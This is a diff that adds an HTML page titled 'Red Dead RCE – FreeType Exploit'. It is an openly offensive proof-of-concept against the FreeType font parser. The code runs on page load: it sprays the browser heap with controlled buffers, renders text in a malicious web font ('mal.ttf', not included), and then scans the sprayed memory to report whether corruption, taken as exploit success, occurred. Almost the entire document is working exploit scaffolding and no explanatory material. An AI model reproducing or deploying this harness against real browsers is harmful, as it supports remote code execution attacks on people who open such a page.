@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Red Dead RCE – FreeType Exploit</title>
+  <style>
+    @font-face {
+      font-family: "ExploitFont";
+      src: url("mal.ttf"); /* ← use mal.ttf instead of crash.otf */
+    }
+
+    body {
+      font-family: monospace;
+      background: #000;
+      color: #0f0;
+      padding: 2em;
+    }
+
+    h1 {
+      color: #0ff;
+    }
+  </style>
+</head>
+<body>
+  <h1>Red Dead RCE</h1>
+  <pre id="log">[!] Waiting for exploit trigger…</pre>
+
+  <script>
+    const log = (msg) => {
+      document.getElementById("log").textContent += "\n" + msg;
+    };
+
+    const SPRAY_SIZE = 10000;
+    const SPRAY_LEN = 16;
+    const PATTERN = 0x43434343;
+    let spray = [];
+
+    function sprayHeap() {
+      log("[*] Spraying heap with controlled buffers…");
+      for (let i = 0; i < SPRAY_SIZE; i++) {
+        const buf = new ArrayBuffer(SPRAY_LEN * 4);
+        const u32 = new Uint32Array(buf);
+        for (let j = 0; j < SPRAY_LEN; j++) {
+          u32[j] = PATTERN;
+        }
+        spray.push(u32);
+      }
+      log("[+] Heap spray complete.");
+    }
+
+    function triggerFont() {
+      log("[*] Triggering FreeType with mal.ttf…");
+      const p = document.createElement("p");
+      p.style.fontFamily = "ExploitFont";
+      p.textContent = "This text uses the exploit font.";
+      document.body.appendChild(p);
+    }
+
+    function checkCorruption() {
+      log("[*] Checking for corrupted memory patterns…");
+
+      let corrupted = false;
+
+      for (let i = 0; i < spray.length; i++) {
+        const buf = spray[i];
+        for (let j = 0; j < buf.length; j++) {
+          if (buf[j] !== PATTERN) {
+            corrupted = true;
+            break;
+          }
+        }
+        if (corrupted) break;
+      }
+
+      if (corrupted) {
+        log("[✅] Exploit likely succeeded — memory corruption detected!");
+        alert("✅ Red Dead RCE: Exploit succeeded!");
+      } else {
+        log("[❌] No memory corruption detected.");
+        alert("❌ Red Dead RCE: Exploit likely failed.");
+      }
+    }
+
+    window.onload = () => {
+      try {
+        sprayHeap();
+
+        setTimeout(() => {
+          triggerFont();
+
+          // Wait a bit for FreeType to parse & (hopefully) corrupt
+          setTimeout(() => {
+            checkCorruption();
+          }, 1000);
+
+        }, 500);
+      } catch (e) {
+        log("[!] Exception: " + e.message);
+        alert("💥 Crash: " + e.message);
+      }
+    };
+  </script>
+</body>
+</html>
